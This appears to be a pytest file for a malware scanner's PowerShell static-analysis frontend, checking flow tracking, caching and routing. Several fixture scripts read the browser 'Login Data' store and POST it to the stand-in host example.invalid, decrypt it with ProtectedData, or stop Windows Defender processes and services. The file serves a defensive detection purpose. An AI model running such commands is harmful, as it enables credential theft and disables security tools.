"""Phase 23 bounded PowerShell frontend and canonical registry regressions."""
from __future__ import annotations

from contextlib import contextmanager
import json
import os
from pathlib import Path

import pytest

from Virus_Scan.contracts.artifact_read_snapshot import build_artifact_read_snapshot
from Virus_Scan.routing.extension_outcome import route_identity_record
from Virus_Scan.routing.extension_scan_router import scan_file_by_type
from Virus_Scan.tests.support.scan_session_fixtures import scan_session_snapshot_fixture
from Virus_Scan.scanners.static_program_analysis import (
    JAVASCRIPT_TYPESCRIPT_FRONTEND_DIGEST,
    POWERSHELL_FRONTEND_DIGEST,
    POWERSHELL_FRONTEND_SCHEMA_VERSION,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID,
    STATIC_PROGRAM_ANALYSIS_FRONTENDS,
    STATIC_PROGRAM_ANALYSIS_PARSER_REGISTRY_DIGEST,
    analyze_powershell_snapshot,
    powershell_analysis_dependency_digest,
)
from Virus_Scan.storage import scan_cache_repository, sqlite_lifecycle


@contextmanager
def _isolated_runtime(tmp_path: Path):
    previous = os.environ.get("UMIGE_BASE_DIR")
    sqlite_lifecycle().close()
    runtime_root = tmp_path / "runtime"
    os.environ["UMIGE_BASE_DIR"] = str(runtime_root)
    try:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=True)
        yield runtime_root
    finally:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=False)
        sqlite_lifecycle().close()
        if previous is None:
            os.environ.pop("UMIGE_BASE_DIR", None)
        else:
            os.environ["UMIGE_BASE_DIR"] = previous


def _analysis(path: Path):
    return analyze_powershell_snapshot(build_artifact_read_snapshot(path)).analysis


def _by_kind(analysis):
    return {
        kind: tuple(sorted(
            (operation for operation in analysis.operations if operation.operation_kind == kind),
            key=lambda operation: operation.control_flow_ordinal,
        ))
        for kind in {operation.operation_kind for operation in analysis.operations}
    }


def test_phase23_registry_is_single_immutable_frontend_owner() -> None:
    assert tuple(item.scanner_id for item in STATIC_PROGRAM_ANALYSIS_FRONTENDS) == (
        "javascript_typescript_static_analysis",
        "powershell_static_analysis",
        "batch_cmd_static_analysis",
        "shell_static_analysis",
        "dotnet_il_static_analysis",
        "native_elf_x86_64_static_analysis",
        "python_renpy_static_analysis",
    )
    assert STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION[".ps1"] is (
        STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID["powershell_static_analysis"]
    )
    assert STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION[".rpy"] is (
        STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID["python_renpy_static_analysis"]
    )
    assert len(STATIC_PROGRAM_ANALYSIS_PARSER_REGISTRY_DIGEST) == 64
    assert STATIC_PROGRAM_ANALYSIS_FRONTENDS[0].frontend_digest == JAVASCRIPT_TYPESCRIPT_FRONTEND_DIGEST
    assert STATIC_PROGRAM_ANALYSIS_FRONTENDS[1].frontend_digest == POWERSHELL_FRONTEND_DIGEST
    with pytest.raises(TypeError):
        STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID["new"] = STATIC_PROGRAM_ANALYSIS_FRONTENDS[0]  # type: ignore[index]

    router_source = Path(
        __import__("Virus_Scan.routing.extension_scan_router", fromlist=["__file__"]).__file__
    ).read_text(encoding="utf-8")
    assert "analyze_powershell_snapshot" not in router_source
    assert "STATIC_PROGRAM_ANALYSIS_FRONTENDS" in router_source


def test_phase23_documentation_comments_and_here_strings_do_not_mint_operations(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "documentation.ps1"
        target.write_text(
            "<# Get-Content 'Browser/Login Data' | Invoke-WebRequest -Method POST #>\n"
            "$documentation = @\"\n"
            "Invoke-WebRequest -Uri https://example.invalid -Body credential\n"
            "\"@\n"
            "Write-Output $documentation\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert analysis.parser_status == "complete"
        assert analysis.operations == ()
        assert analysis.flow_edges == ()


def test_phase23_static_flow_survives_serialize_and_attached_parameters(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "flow.ps1"
        target.write_text(
            "Get-Content 'Browser/Login Data' | ConvertTo-Json | "
            "Invoke-WebRequest -Uri:https://example.invalid/upload -Method:POST\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)
        correlated = (
            operations["file_read"][0],
            operations["serialize"][0],
            operations["network_send"][0],
            operations["network_upload"][0],
        )

        assert analysis.parser_status == "complete"
        assert "credential_store_discovery" in operations
        assert len({operation.flow_identity for operation in correlated}) == 1
        assert correlated[0].flow_identity.startswith("flow_")
        assert operations["network_connect"][0].flow_identity == ""
        assert len([edge for edge in analysis.flow_edges if edge.edge_kind == "source_to_sink"]) == 3


def test_phase23_escaped_interpolation_does_not_create_false_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "escaped.ps1"
        target.write_text(
            "$secret = Get-Content 'secret.txt'\n"
            "$literal = \"`$secret\"\n"
            "Invoke-WebRequest -Uri https://example.invalid -Method:POST -Body:$literal\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert operations["file_read"][0].flow_identity.startswith("flow_")
        assert operations["network_send"][0].flow_identity == ""
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_function_analysis_cannot_read_future_script_scope_state(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "future_scope.ps1"
        target.write_text(
            "function Send-Later {\n"
            "  Invoke-WebRequest -Uri https://example.invalid -Method POST -Body $payload\n"
            "}\n"
            "Send-Later\n"
            "$payload = Get-Content 'secret.txt'\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert operations["network_send"][0].flow_identity == ""
        assert operations["network_send"][0].resolution_state == "partial"
        assert "argument_unresolved" in operations["network_send"][0].limitations
        assert "variable_unresolved:payload" in analysis.unresolved_constructs
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_dynamic_pipeline_breaks_authoritative_value_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "dynamic.ps1"
        target.write_text(
            "Get-Content 'secret.txt' | Invoke-Expression | "
            "Invoke-WebRequest -Uri https://example.invalid -Method POST\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert operations["file_read"][0].flow_identity.startswith("flow_")
        assert operations["network_send"][0].flow_identity == ""
        assert "dynamic_command:invoke-expression" in analysis.unresolved_constructs
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_multiple_independent_sources_abstain_from_one_sink_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "ambiguous.ps1"
        target.write_text(
            "$left = Get-Content 'left.txt'\n"
            "$right = Get-Content 'right.txt'\n"
            "Invoke-WebRequest -Uri https://example.invalid -Method POST -Body \"$left$right\"\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert len(operations["file_read"]) == 2
        assert operations["network_send"][0].flow_identity == ""
        assert operations["network_send"][0].resolution_state == "partial"
        assert "ambiguous_source_flow" in operations["network_send"][0].limitations
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_duplicate_function_name_abstains_from_call_resolution(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "duplicate_function.ps1"
        target.write_text(
            "function Launch { Start-Process one.exe }\n"
            "function Launch { Start-Process two.exe }\n"
            "Launch\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert analysis.operations == ()
        assert "duplicate_function_name" in analysis.limitations
        assert "duplicate_function:launch" in analysis.unresolved_constructs
        assert "ambiguous_function_call:launch" in analysis.unresolved_constructs


def test_phase23_dotnet_assignment_and_decrypt_preserve_static_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "dotnet.ps1"
        target.write_text(
            "$encrypted = [System.IO.File]::ReadAllBytes('Browser/Login Data')\n"
            "$plain = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted)\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert operations["file_read"][0].flow_identity.startswith("flow_")
        assert operations["decrypt"][0].flow_identity == operations["file_read"][0].flow_identity
        assert operations["decrypt"][0].platform == "windows"
        assert any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_utf16_resource_limit_is_truncated_not_uncaught(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "deep.ps1"
        source = "".join("if ($true) {\n" for _ in range(130))
        source += "Write-Output 'bounded'\n"
        source += "".join("}\n" for _ in range(130))
        target.write_bytes(source.encode("utf-16"))

        analysis = _analysis(target)

        assert analysis.parser_status == "truncated"
        assert analysis.integrity_status == "partial"
        assert "powershell_nesting_limit_exceeded" in analysis.limitations


def test_phase23_network_direction_and_security_target_semantics_are_atomic(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "atomic.ps1"
        target.write_text(
            "Invoke-WebRequest -Uri https://example.invalid -Method GET -ContentType application/json\n"
            "Start-BitsTransfer -Source https://example.invalid/file -Destination out.bin -Upload\n"
            "Stop-Process -Name notepad\n"
            "Stop-Service -Name spooler\n"
            "Stop-Process -Name MsMpEng\n"
            "Stop-Service -Name WinDefend\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert len(operations["network_download"]) == 1
        assert len(operations["network_send"]) == 1
        assert len(operations["network_upload"]) == 1
        assert len(operations["security_process_terminate"]) == 1
        assert len(operations["security_service_stop"]) == 1
        assert "generic_process_terminate:notepad" in analysis.unresolved_constructs
        assert "generic_service_stop:spooler" in analysis.unresolved_constructs


def test_phase23_cache_is_exact_and_failed_results_are_not_reused(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        good = tmp_path / "good.ps1"
        good.write_text("Get-Content 'secret.txt'\n", encoding="utf-8")
        snapshot = build_artifact_read_snapshot(good)
        first = analyze_powershell_snapshot(snapshot)
        second = analyze_powershell_snapshot(snapshot)

        assert first.cache_source == "computed"
        assert second.cache_source == "sqlite_cache"
        assert first.analysis.semantic_digest == second.analysis.semantic_digest
        assert first.analysis.parser_digest == POWERSHELL_FRONTEND_DIGEST
        assert first.analysis.parser_schema_version == POWERSHELL_FRONTEND_SCHEMA_VERSION

        bad = tmp_path / "bad.ps1"
        bad.write_text("if (\n", encoding="utf-8")
        bad_snapshot = build_artifact_read_snapshot(bad)
        bad_first = analyze_powershell_snapshot(bad_snapshot)
        bad_second = analyze_powershell_snapshot(bad_snapshot)

        assert bad_first.analysis.parser_status == "failed"
        assert bad_first.cache_source == "computed"
        assert bad_second.cache_source == "computed"
        assert scan_cache_repository().get_static_analysis(
            content_sha256=bad_snapshot.content_sha256,
            analysis_dependency_digest=powershell_analysis_dependency_digest(),
        ) is None


def test_phase23_router_preserves_lexical_fallback_and_static_scope(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "route.ps1"
        target.write_text(
            "$data = Get-Content 'secret.txt'\n"
            "Invoke-WebRequest -Uri https://example.invalid -Method:POST -Body:$data\n",
            encoding="utf-8",
        )
        snapshot = build_artifact_read_snapshot(target)
        outcome = scan_file_by_type(str(target), scan_session_snapshot=scan_session_snapshot_fixture(), artifact_read_snapshot=snapshot)
        identity = route_identity_record(outcome.identity)

        assert identity is not None
        summary = identity["static_program_analysis"]
        assert summary["scanner_id"] == "powershell_static_analysis"
        assert summary["parser_status"] == "complete"
        assert summary["parser_digest"] == POWERSHELL_FRONTEND_DIGEST
        decisions = {
            item["scanner_id"]: item
            for item in identity["scanner_execution_plan"]["decisions"]
        }
        assert decisions["powershell_static_analysis"]["outcome_status"] == "complete_with_observation"
        assert decisions["batch_cmd_static_analysis"]["outcome_status"] == "not_applicable"
        assert decisions["python_renpy_static_analysis"]["outcome_status"] == "not_applicable"
        static_records = tuple(
            record for record in outcome.tag_evidence.records
            if record.source_detector == "powershell_static_analysis"
        )
        assert static_records
        assert all(record.modality == "static_control_flow" for record in static_records)

        malformed = tmp_path / "malformed.ps1"
        malformed.write_text(
            "Invoke-Expression 'powershell -enc AAA'\nif (\n",
            encoding="utf-8",
        )
        malformed_outcome = scan_file_by_type(
            str(malformed),
            scan_session_snapshot=scan_session_snapshot_fixture(),
            artifact_read_snapshot=build_artifact_read_snapshot(malformed),
        )
        malformed_identity = route_identity_record(malformed_outcome.identity)

        assert malformed_identity is not None
        assert malformed_identity["static_program_analysis"]["parser_status"] == "failed"
        assert "powershell_exec" in malformed_outcome.tags
        assert "encoded_powershell" in malformed_outcome.tags


def test_phase23_physical_records_contain_no_attack_or_probability_authority(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "scope.ps1"
        target.write_text("Start-Process cmd.exe\n", encoding="utf-8")
        record = _analysis(target).to_record()
        text = json.dumps(record, sort_keys=True).casefold()

        assert "attack_technique" not in text
        assert "p_mitre" not in text
        assert "runtime_occurrence" not in text
        assert "execution_observed" not in text
